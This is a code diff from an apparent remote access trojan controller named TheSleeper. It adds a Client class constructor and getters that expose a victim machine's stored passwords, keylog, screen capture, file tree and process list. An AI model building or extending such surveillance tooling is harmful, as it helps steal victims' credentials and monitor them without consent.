@@ -26,6 +26,16 @@ namespace TheSleeper
             }
     };
     
+	Client::Client(Blaspheme::Session _session, QObject * parent)
+		:session(_session), QObject(parent)
+	{
+		status = tr("Online");
+		updateClientName();
+		updateSystemVersion();
+		updatePasswords();
+		updateLogicalVolumes();
+	}
+
     void Client::disconnect()
     {
 		LOG << "Reset des connexions.";
@@ -54,6 +64,66 @@ namespace TheSleeper
         }
 		return "Undefined System";
     }
+
+	QStandardItemModel& Client::getRemoteFileTree()
+	{
+		return remote_files;
+	}
+
+	QStringList& Client::getStoredPasswords()
+	{
+		return stored_passwords;
+	}
+
+	void Client::addStream(Network::TcpClient new_stream)
+	{
+		session.pushStream(new_stream);
+	}
+
+	Blaspheme::SessionId Client::getUniqueId()
+	{
+		return session.getId();
+	}
+
+    QString Client::getIp()
+	{
+		return session.stream().getIp().c_str();
+	}
+
+    QString Client::getPort()
+	{
+		return QString::number(session.stream().getPort());
+	}
+
+    QString Client::getStatus()
+	{
+		return status;
+	}
+
+    QString Client::getName()
+	{
+		return name;
+	}
+
+    QString Client::getSystemVersion()
+	{
+		return system_version;
+	}
+
+    const QString& Client::getKeylog()
+	{
+		return current_keylog;
+	}
+
+    QPixmap& Client::getScreen()
+	{
+		return screen;
+	}
+
+	QStringList& Client::getProcessList()
+	{
+		return processes;
+	}
 
     void Client::updateProcessList()
     {
@@ -574,7 +644,6 @@ namespace TheSleeper
             emit disconnected();
         }
     }
-
 
 	void Client::updateSystemVersion()
 	{
